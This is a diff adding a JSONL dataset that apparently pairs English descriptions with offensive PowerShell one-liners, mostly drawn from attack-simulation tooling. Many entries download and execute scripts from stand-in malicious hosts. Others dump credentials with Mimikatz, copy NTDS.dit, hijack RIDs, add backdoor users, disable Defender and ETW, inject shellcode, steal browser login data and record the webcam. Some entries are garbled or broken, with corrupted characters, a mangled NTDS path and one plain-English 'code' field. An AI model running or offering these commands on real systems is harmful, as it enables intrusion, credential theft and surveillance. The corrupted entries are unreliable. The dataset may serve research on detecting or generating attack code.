@@ -1,0 +1,115 @@
+{"nl": "Execute PowerShell code to open the Windows calculator using remote command execution.", "code": "$code = {Invoke-Expression -Command \"calc.exe\"}; Invoke-Command -ScriptBlock $code"}
+{"nl": "Attempt to perform RID hijacking on the user account \"Peter\" with RID 500.", "code": "Invoke-RIDHijacking -User Peter -RID 500"}
+{"nl": "Execute a command on a remote host using PowerShell remoting.", "code": "Invoke-Command -ComputerName <remote_host> -ScriptBlock { <command> }"}
+{"nl": "Connect to Azure AD, retrieve the user principal name, and remove the corresponding user.", "code": "Connect-AzureAD ; $userprincipalname = \"${userprincipalname}\" ; Remove-AzureADUser -ObjectId $userprincipalname"}
+{"nl": "Create a minidump file for the process with ID 3742.", "code": "Out-Minidump -Process (Get-Process -Id 3742)"}
+{"nl": "Execute a PowerShell script with bypassing execution policy and hiding the window.", "code": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File bad_script.ps1"}
+{"nl": "Modify the Windows Registry to change the user's shell, possibly for persistence.", "code": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, ${binary}\" -Force"}
+{"nl": "Invoke Inveigh with HTTP protocol specified as \"N.\"", "code": "Invoke-Inveigh -HTTP N"}
+{"nl": "Enable PowerShell remoting on the local machine.", "code": "Enable-PSRemoting -Force"}
+{"nl": "Retrieve the version of the operating system.", "code": "[environment]::OSVersion.Version"}
+{"nl": "Execute a custom tool named \"xordump_exe\" with specific parameters.", "code": "${xordump_exe} -out ${OutFile} -x 0x41"}
+{"nl": "Compress files from the specified directory into an archive.", "code": "dir ${InputFile} -Recurse | Compress-Archive -DestinationPath ${OutputFile}"}
+{"nl": "Execute a hidden PowerShell script with bypassing execution policy.", "code": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File (evil.ps1)"}
+{"nl": "Remove a SMB share and a file share with specified names.", "code": "Remove-SmbShare -Name ${share_name} ; Remove-FileShare -Name ${share_name}"}
+{"nl": "Set a file path and execute the corresponding PowerShell script.", "code": "$FilePath = \"C:\\payload.ps1\"; Invoke-Expression -Command $FilePath"}
+{"nl": "Download and execute code from an untrusted URL on a remote computer.", "code": "Invoke-Command -ComputerName <TargetIP> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('<UntrustedURL>') }"}
+{"nl": "Perform DNS lookup for the specified IP address.", "code": "nslookup ${remote.host.ip}"}
+{"nl": "Download and execute PowerShell code from a remote server.", "code": "$code = 'IEX (New-Object Net.WebClient).DownloadString('https://evil.site/evil_code.ps1')'; Invoke-Expression $code"}
+{"nl": "Search for indexed items with specific criteria.", "code": "Get-IndexedItem -Filter Contains(*,'Stingray'), kind = 'picture', keywords='idCard'"}
+{"nl": "Execute obfuscated PowerShell script from a remote GitHub repository.", "code": "powershell.exe -ep bypass -c (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')"}
+{"nl": "Invoke a WMI command to create a process on a remote node.", "code": "wmic /node:${node} process call create \"rundll32.exe ${dll_to_execute} ${function_to_execute}\""}
+{"nl": "Download and execute PowerShell code from a potentially malicious website.", "code": "Invoke-Expression -Command \u00ef\u00bf\u00bd IEX (New-Object Net.WebClient).DownloadString('http://dangerExample.com/Kern132.ps1')"}
+{"nl": "Download and execute PowerShell code from a potentially malicious URL.", "code": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious-url.com/malicious.ps1')\""}
+{"nl": "Attempt to perform RID hijacking using the Guest account with RID 500.", "code": "Invoke-RIDHijacking -UseGuest -RID 500"}
+{"nl": "Download and execute PowerShell code from a potentially malicious GitHub repository on a remote system.", "code": "Invoke-Command -ComputerName <remote_system> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject')}"}
+{"nl": "Retrieve group memberships for a specified Active Directory user.", "code": "get-ADPrincipalGroupMembership ${user} | select name"}
+{"nl": "Modify PowerShell profile to add content and start a process.", "code": "Add-Content ${ps_profile} -Value \"\" ; Add-Content ${ps_profile} -Value \"Start-Process ${exe_path}\" ; powershell -Command exit"}
+{"nl": "Create a Unicode-encoded string in PowerShell.", "code": "$a = \"Write-Host 'Hello World!'\";  $b = [System.Text.Encoding]::Unicode.Get"}
+{"nl": "Execute a PowerShell script with specific execution settings and encoded command.", "code": "powershell.exe -NoP -sta -NonI -W Hidden -Exec Bypass -Encode dCommand <Base64Encode dScript>"}
+{"nl": "Perform DNS resolutions in a loop with random subdomains.", "code": "for($i=0; $i -le ${query_volume}; $i++) { Resolve-DnsName -type \"${queryType}\" \"${Subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).${Domain}\" -QuickTimeout}"}
+{"nl": "Attempt privilege escalation to achieve system-level access.", "code": "Get-System -RevToSelf"}
+{"nl": "List configuration information for application pools using appcmd.exe.", "code": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /config"}
+{"nl": "Read content from a file and send it as a POST request to a specified IP address.", "code": "$content = Get-Content ${input_file} ; Invoke-WebRequest -Uri ${ip_address} -Method POST -Body $content"}
+{"nl": "Use NinjaCopy to copy the NTDS.dit file from a remote server to a local destination.", "code": "$NtdsBytes = Invoke-NinjaCopy -Path 'C:\\windows;tds;tds.dit' -ComputerName 'Server1' -LocalDestination 'c:\\test;tds.dit'"}
+{"nl": "Pause the execution for 60 seconds.", "code": "sleep 60"}
+{"nl": "Change directory to the temporary folder and execute Kerbrute for Kerberos bruteforcing.", "code": "cd $env:temp ; .\\kerbrute.exe bruteforce --dc ${domaincontroller} -d ${domain} $env:temp\\bruteforce.txt"}
+{"nl": "Use NinjaCopy to copy the NTDS.dit file from a local path to a remote destination on a server.", "code": "Invoke-NinjaCopy -Path 'C:\\windows;tds;tds.dit' -RemoteDestination 'c:\\windows\\temp;tds.dit' -ComputerName 'Server1'"}
+{"nl": "Invoke Mimikatz to dump credentials on multiple computers.", "code": "Invoke-Mimikatz -DumpCreds -ComputerName @(computer1, computer2)"}
+{"nl": "Execute PowerShell code stored in the variable \"adrecon_path\" using Invoke-Expression.", "code": "Invoke-Expression ${adrecon_path}"}
+{"nl": "Attempt to elevate privileges to achieve system-level access.", "code": "Get-System"}
+{"nl": "Install a new web global module with specified name and DLL path.", "code": "New-WebGlobalModule -Name ${module_name} -Image ${dll_path}"}
+{"nl": "Execute malicious code on a remote system using PowerShell remoting.", "code": "Invoke-Command -ComputerName <TargetSystem> -ScriptBlock {< maliciouscode >}"}
+{"nl": "Download and execute PowerShell code from a potentially malicious server.", "code": "powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://malicious-server.example.com/hack_script')\""}
+{"nl": "Invoke an HTML Application (HTA) with specific parameters.", "code": "Invoke-ATHHTMLApplication -ScriptEngine ${script_engine} -InlineProtocolHandler ${protocol_handler} -MSHTAFilePath ${mshta_file_path}"}
+{"nl": "Execute a PowerShell script with specific execution settings.", "code": "powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -File Win32.ps1"}
+{"nl": "Retrieve and group indexed items based on specific criteria.", "code": "Get-IndexedItem -Filter 'System.Kind = 'Music' AND AlbumArtist like '%' ' | Group-Object -NoElement -Property 'AlbumArtist' | sort -Descending -property count"}
+{"nl": "Inject DLL payload into a running process using mavinject and then stop the notepad process.", "code": "$mypid = ${process_id} ; mavinject $mypid /INJECTRUNNING ${dll_payload} ; Stop-Process -processname notepad"}
+{"nl": "Execute PsExec to add a user with specific credentials on a remote computer.", "code": "Invoke-PsExec -ComputerName 192.168.50.200 -Command 'net user backdoor password123 /add' -ServiceName Updater32"}
+{"nl": "Copy the Opera browser's login data to the temporary folder.", "code": "Copy-Item \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\" -Destination $env:temp"}
+{"nl": "Create a new registry item to disable Event Tracing for Windows (ETW).", "code": "New-ItemProperty -Path HKLM:\\Software\\Microsoft\\.NETFramework -Name ETWEnabled -Value 0 -PropertyType \"DWord\" -Force"}
+{"nl": "Download and execute a Metasploit payload from a specified URL.", "code": "Invoke-MetasploitPayload -url https://evil.example.com/2k1isEdsl"}
+{"nl": "Execute a PowerShell script with bypassing execution policy.", "code": "powershell.exe -ExecutionPolicy ByPass -NoProfile -File \"C:\\evil.ps1\""}
+{"nl": "Attempt to perform RID hijacking on the user account \"Alex\" with RID 500.", "code": "Invoke-RIDHijacking -User Alex -RID 500"}
+{"nl": "Encode and execute Mimikatz code using Win32 API.", "code": "$code = 'Invoke-Mimikatz'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($code); $handle = [Win32.WinApi]::ExecuteCode($bytes)"}
+{"nl": "Execute custom PowerShell code on a remote host.", "code": "Invoke-Command -ComputerName <remote_host> -ScriptBlock { < code > }"}
+{"nl": "Create a new registry item to disable privacy experience during Windows Out-Of-Box Experience (OOBE).", "code": "New-ItemProperty \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\" -Name DisablePrivacyExperience -PropertyType DWord -Value 1 -Force"}
+{"nl": "Modify Windows Defender settings to disable anti-spyware features.", "code": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1"}
+{"nl": "Create a minidump file for the process with ID 2929.", "code": "Out-Minidump -Process (Get-Process -Id 2929)"}
+{"nl": "Start a process and then launch a new process under a specific parent with specified parameters.", "code": "Start-Process -FilePath ${parent_name} -PassThru | Start-ATHProcessUnderSpecificParent -FilePath ${file_path} -CommandLine '${command_line}'"}
+{"nl": "Execute a PowerShell script with bypassing execution policy.", "code": "powershell.exe -ExecutionPolicy Bypass -File \"C:\\Juve.ps1\""}
+{"nl": "Exploit a backdoor in a LNK file for malicious activities.", "code": "Invoke-BackdoorLNK -LNKPath C:\\Users\\john\\Desktop\\Firefox.lnk -EncScript AA..."}
+{"nl": "Download and execute a file from a potentially malicious server using Invoke-Expression.", "code": "Invoke-Expression -Command \"& { (New-Object Net.WebClient).DownloadFile('http://malicious_server.com/malicious_')}\""}
+{"nl": "Download and execute PowerShell code from a potentially malicious server with specific encoding.", "code": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass \ufffdiex (New-Object Net.WebClient).DownloadString('http://danger.example-server.com/exploitSys.ps1')\ufffd"}
+{"nl": "Copy an Excel VBA add-in to the Excel startup folder and start Excel.", "code": "Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\ExcelVBAaddin.xlam\" \"$env:APPDATA\\Microsoft\\Excel\\XLSTART ; otepad.xlam\" ; Start-Process \"Excel\""}
+{"nl": "Retrieve a PowerShell script for post-hashdump actions and execute it.", "code": "$enc = Get-PostHashdumpScript ; powershell.exe -command $enc"}
+{"nl": "Retrieve information about Active Directory replication accounts on a specific server.", "code": "Get-ADReplAccount -All -Server ${logonserver}"}
+{"nl": "Retrieve information about domain accounts using the \"net accounts\" command.", "code": "net accounts /domain"}
+{"nl": "Attempt to perform RID hijacking on the user account \"Robert\" with RID 1002 and a specified password.", "code": "Invoke-RIDHijacking -User Robert -RID 1002 -Password Password9 -Enable"}
+{"nl": "Download and execute PowerShell code from a chain of commands using Invoke-Expression.", "code": "Invoke-Expression -Command \"Invoke-WebRequest -Uri 'http://malicious.site/malicious.ps1' | Invoke-Expression\""}
+{"nl": "Retrieve information about child items in the specified path.", "code": "Get-ChildItem -Path ${host.system.path}"}
+{"nl": "Map a new PowerShell drive to a specified network share.", "code": "New-PSDrive -name ${map_name} -psprovider filesystem -root \\\\${computer_name}\\${share_name}"}
+{"nl": "Download and execute PowerShell code from a potentially malicious URL with bypassing execution policy.", "code": "powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://malicious-url.com/malicious-script.ps1')\""}
+{"nl": "Execute the Windows calculator using Invoke-Expression.", "code": "Invoke-Expression -Command \"calc.exe\""}
+{"nl": "Execute Mimikatz using Invoke-Expression.", "code": "Invoke-Expression -Command \"Invoke-Mimikatz\""}
+{"nl": "Retrieve the path of the current process, construct an injection command, and execute reflective PE injection.", "code": "$process = (Get-Process -Id $pid).Path; $injection = \"Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExePath $($process)\""}
+{"nl": "Retrieve information about the default web browser.", "code": "Get-BrowserInformation"}
+{"nl": "Perform DNS MX record lookup for a specified domain and filter the output for mail-related information.", "code": "(nslookup -querytype=mx ${target.org.domain}. | Select-String -pattern 'mail' | Out-String).Trim()"}
+{"nl": "Inject shellcode into a process with ID 7880.", "code": "Invoke-Shellcode -ProcessId 7880"}
+{"nl": "Download and execute PowerShell code from a specified URL with bypassing execution policy.", "code": "powershell.exe -nop -ep bypass -c IEX (New-Object Net.WebClient).DownloadString('https://malicious.url/malicious_script.ps1');\u00ef\u00bf\u00bd"}
+{"nl": "Execute a hidden PowerShell command", "code": "Invoke-Command -ComputerName <target> -ScriptBlock {powershell -nop -w hidden -c <command>}"}
+{"nl": "Attempt to load Mimikatz into the PowerShell profile for future execution.", "code": "$profile = $profile + \"`n\" + \"Invoke-Mimikatz\"; Invoke-Expression $profile"}
+{"nl": "Send a malicious email with an attachment for test purposes.", "code": "Send-MailMessage -From ${sender} -To ${receiver} -Subject 'T1027_Atomic_Test' -Attachments ${input_file} -SmtpServer ${smtp_server}"}
+{"nl": "Download and execute a malicious payload from a remote server.", "code": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/malicious-payload.ps1')\""}
+{"nl": "Execute a DLL through WMI on a remote node using rundll32.", "code": "wmic /node:${node} process call create \"rundll32.exe ${your_dll} ${YourFuctionToExecute}\""}
+{"nl": "Execute PowerShell with a hidden window and bypass execution policy to run malicious code.", "code": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand [Base64 encoded malicious code]"}
+{"nl": "Execute a Base64-encoded PowerShell script with hidden window and bypassing execution policy.", "code": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"Invoke-Expression -Command ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('base64EncodedScript')))\""}
+{"nl": "Execute a malicious PowerShell script with execution policy bypass and a hidden window.", "code": "powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden -file malicious.ps1"}
+{"nl": "Query PnP entities to find imaging devices on the system.", "code": "Get-CimInstance -Query \"SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Img' OR PNPClass = 'Cam')\""}
+{"nl": "Run Inveigh tool with specific spoofing configurations.", "code": "Invoke-Inveigh -SpooferRepeat N -WPADAuth Anonymous -SpooferHostsReply host1,host2 -SpooferIPsReply 192.168.2.75,192.168.2.76"}
+{"nl": "Search for files with the name \"Formula 1\" on a remote server's 'users' share.", "code": "Finds files entitled Formula 1 on the 'users' share of a remote server named 'Atom-Engine'"}
+{"nl": "Perform RID Hijacking on the host with RID 500 and specified password.", "code": "Invoke-RIDHijacking -UseHost -RID 500 -Password Password1"}
+{"nl": "Start recording the webcam for 15 seconds and save the output to 'C:\\webcam.mkv'.", "code": "Start-WebcamRecorder -RecordTime 15 -OutPath 'C:\\webcam.mkv'"}
+{"nl": "Encrypt a file using GPG with specified GPG executable and file locations.", "code": "cmd /c '${GPG_Exe_Location}' -c '${File_to_Encrypt_Location}'"}
+{"nl": "Compress files in the specified input path and save the archive to the specified destination path.", "code": "Compress-Archive -Path ${InputF} -DestinationPath ${OutputF} -Force"}
+{"nl": "Invoke a command on a remote computer to download and execute a malicious script.", "code": "Invoke-Command -ComputerName <target> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/malicious_script') }"}
+{"nl": "Execute a PowerShell script named Kern64.ps1 with execution policy bypass.", "code": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File Kern64.ps1"}
+{"nl": "Perform credential injection targeting the domain 'demo' and the 'administrator' account with a new winlogon session.", "code": "Invoke-CredentialInjection -DomainName 'demo' -UserName 'administrator' -Password 'Password1' -NewWinLogon -AuthPackage Msv1_0"}
+{"nl": "Import the PowerView module and retrieve information about domain computers.", "code": "Import-Module .\\powerview.ps1; ; Get-DomainComputer"}
+{"nl": "Copy Microsoft Edge user data to a temporary folder.", "code": "Copy-Item \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\" -Destination $env:temp\\Edge -Force -Recurse"}
+{"nl": "Modify the creation time of files in the specified path to the target date and time.", "code": "Get-ChildItem ${file_path} | % { $_.CreationTime = \"${target_date_time}\" }"}
+{"nl": "Manipulate tokens to create a new process (cmd.exe) with a specific thread ID.", "code": "Invoke-TokenManipulation -CreateProcess 'cmd.exe' -ThreadId 323"}
+{"nl": "Retrieve information about Win32 processes using WMI.", "code": "get-wmiObject -class Win32_Process"}
+{"nl": "Perform RID Hijacking on the guest account with RID 500 and specified password.", "code": "Invoke-RIDHijacking -UseGuest -RID 500 -Password Password1"}
+{"nl": "Retrieve information about SMB shares on the system.", "code": "get-smbshare"}
+{"nl": "Run the Nightmare tool to create a new user 'Pedrol' with password 'password1' and specified driver name.", "code": "Invoke-Nightmare -NewUser 'Pedrol' -NewPassword 'password1' -DriverName 'driver'"}
+{"nl": "Invoke a command on a remote server using PowerShell with specific options and an encoded command.", "code": "Invoke-Command -ComputerName [REMOTE_SERVER] -ScriptBlock { PowerShell.exe -NoP -NonI -W Hidden -Enc [ENcode D_COMMAND] }"}
+{"nl": "Change the current location to the specified folder and run a PowerShell script with specific parameters.", "code": "Set-Location PathToAtomicsFolder ; .\\T1071.004\\src\\T1071-dns-domain-length.ps1 -Domain ${domain} -Subdomain ${subdomain} -QueryType ${query_type}"}
+{"nl": "Invoke a PowerShell command on a remote system using the specified PowerShell code.", "code": "Invoke-Command -ComputerName <remote_system_name> -ScriptBlock {<powershell_code>}"}
+{"nl": "Download and execute a script from a remote URL to dump Windows credentials.", "code": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1') ; Invoke-WCMDump"}
+{"nl": "Retrieve Group Policy Preferences passwords.", "code": "Get-GPPPassword"}
+{"nl": "Download and execute a PowerShell script from a remote server.", "code": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://heavy-exploit.site/evilexample.ps1')\""}
+{"nl": "Manipulate tokens to create a new process (cmd.exe) with the username 'nt authority\\system'.", "code": "Invoke-TokenManipulation -CreateProcess 'cmd.exe' -Username nt authority\\system"}
+{"nl": "Execute a PowerShell script named maliciousscript.ps1 with execution policy bypass.", "code": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File maliciousscript.ps1"}
+{"nl": "Execute PowerShell code with hidden window, no profile, and loading code from the file WinPwn.ps1.", "code": "powershell -w hidden -nop -c $x=(gc c:\\WinPwn.ps1);iex $x"}
+{"nl": "Retrieve indexed items from the specified path, filter by camera maker, and group by focal length.", "code": "Get-IndexedItem -path c:\\ -recurse  -Filter cameramaker=pentax! -Property focallength | group focallength -no | sort -property @{e={[double]$_.name}}"}
